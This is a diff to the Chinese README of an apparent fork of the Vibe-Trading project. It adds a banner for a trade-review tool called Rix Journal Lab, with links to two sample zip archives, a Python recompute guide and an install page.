@@ -1,3 +1,11 @@
+## Rix Journal Lab
+
+可自托管、可独立复算的交易复盘工具。把成交证据包带到另一台机器，从报告数字追到原始成交。基于 HKUDS/Vibe-Trading。
+
+[下载约 43 KB 的样例](https://raw.githubusercontent.com/MetaAviator/Vibe-Trading/1e2c579ef20ae901a1d57b92f3e6920ec58ab572/maintenance/journal/replay-starter.zip) · [用 Python 3.12 复算 4.00 USD](https://github.com/MetaAviator/Vibe-Trading/blob/1e2c579ef20ae901a1d57b92f3e6920ec58ab572/maintenance/journal/TRY_JOURNAL_LAB.md)
+
+[下载逐笔 FIFO 与离线 HTML 样例](https://raw.githubusercontent.com/MetaAviator/Vibe-Trading/1e2c579ef20ae901a1d57b92f3e6920ec58ab572/maintenance/journal/review-starter.zip) · [安装 Journal Lab](https://github.com/MetaAviator/Vibe-Trading/blob/1e2c579ef20ae901a1d57b92f3e6920ec58ab572/maintenance/journal/INSTALL.md)
+
 <p align="center">
   <a href="README.md">English</a> | <b>中文</b> | <a href="README_ja.md">日本語</a> | <a href="README_ko.md">한국어</a> | <a href="README_ar.md">العربية</a> | <a href="README_es.md">Español</a> | <a href="README_id.md">Bahasa Indonesia</a>
 </p>
